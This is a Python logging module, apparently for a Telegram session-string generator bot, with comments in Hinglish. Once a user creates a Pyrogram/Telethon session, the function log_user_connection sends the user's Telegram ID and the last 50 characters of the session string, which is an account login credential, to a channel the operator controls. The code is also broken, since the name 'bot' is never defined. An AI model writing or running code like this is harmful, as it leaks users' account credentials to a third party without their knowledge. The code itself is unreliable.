import os
import asyncio
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

LOG_OWNER_ID = int(os.getenv("LOG_OWNER_ID"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))

# ====================== LOGGER ======================
async def log_to_channel(message: str, extra_text: str = ""):
    try:
        text = f"🟢 **James String Generator - New Connection**\n\n"
        text += message
        if extra_text:
            text += f"\n\n📌 **Extra Info:**\n{extra_text}"

        text += f"\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        text += f"\n🆔 **User ID:** {extra_text.split('User ID:')[-1].strip() if 'User ID:' in extra_text else 'N/A'}"

        await asyncio.sleep(0.3)
        await bot.send_message(chat_id=LOG_CHANNEL_ID, text=text, parse_mode="Markdown")
    except Exception as e:
        print(f"❌ Logger error: {e}")


# ====================== BOT APP KE SAATH CONNECT ======================
from bot import app

@app.on_startup()
async def on_startup():
    print("✅ Bot Started - Logger ready")
    await log_to_channel(
        "**Bot is now online and ready for new connections!**",
        "Environment: Production\nUsers: Unlimited"
    )


# ====================== USER CONNECT KARNE PAR ======================
async def log_user_connection(user_id: int, session_string: str):
    short_session = session_string[-50:] if session_string else "N/A"

    message = (
        "✅ **User ne session connect kar diya!**\n\n"
        "🔑 **Session Connected Successfully**\n"
        f"👤 **Telegram ID:** {user_id}\n"
        f"📱 **Session Last 50 chars:** `{short_session}`\n"
        "🟢 **Ab user Pyrogram/Telethon mein use kar sakta hai**"
    )

    extra_info = f"User ID: {user_id}\nSession Connected: Yes"
    await log_to_channel(message, extra_info)


# ====================== SESSION GENERATION KE BAAD LOG ======================
async def after_session_generation(session_string: str, user_id: int):
    await log_user_connection(user_id, session_string)
